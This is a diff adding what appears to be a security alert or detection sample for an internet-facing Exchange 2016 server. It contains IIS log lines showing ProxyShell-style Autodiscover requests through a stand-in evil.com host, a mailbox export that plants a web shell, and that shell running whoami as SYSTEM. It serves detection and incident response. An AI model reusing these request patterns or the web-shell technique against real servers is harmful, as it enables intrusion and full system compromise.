@@ -1,0 +1,11 @@
+ALERT: Suspicious Autodiscover requests followed by web shell creation on Exchange server
+Host: MAIL-01 (10.10.1.25), Microsoft Exchange Server 2016 CU19, internet-facing via 443
+
+--- IIS W3SVC1 log ---
+2026-10-15 22:41:03 10.10.1.25 POST /autodiscover/autodiscover.json @evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com 443 - 192.0.2.66 python-requests/2.31 - 200
+2026-10-15 22:41:09 10.10.1.25 POST /autodiscover/autodiscover.json @evil.com/powershell?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9z&Email=autodiscover/autodiscover.json%3F@evil.com 443 - 192.0.2.66 python-requests/2.31 - 200
+2026-10-15 22:41:31 10.10.1.25 GET /aspnet_client/shell_x7.aspx cmd=whoami 443 - 192.0.2.66 Mozilla/5.0 - 200
+
+--- EDR process tree ---
+w3wp.exe (MSExchangePowerShellAppPool) -> New-MailboxExportRequest -Mailbox administrator -FilePath \\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\shell_x7.aspx
+w3wp.exe (MSExchangeOWAAppPool) -> cmd.exe /c whoami  (user: NT AUTHORITY\SYSTEM)
